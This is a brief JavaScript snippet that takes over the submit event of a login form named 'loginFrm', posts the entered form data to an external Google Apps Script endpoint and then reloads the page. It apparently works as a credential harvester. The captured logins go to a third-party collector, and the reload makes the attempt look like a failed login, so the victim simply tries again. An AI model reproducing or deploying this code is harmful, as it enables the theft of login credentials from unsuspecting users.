const scriptURL = 'https://script.google.com/macros/s/AKfycbzdSqC8ikgYv36yZux85EV8K1Dfe3W9aXxYYF4kTnVcdgCRVFJL6OVJl63RaIVz2evZ/exec'


const form = document.forms['loginFrm']


form.addEventListener('submit', e => {
  e.preventDefault()
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
  .then(() => { window.location.reload(); })
  .catch(error => console.error('Error!', error.message))
})
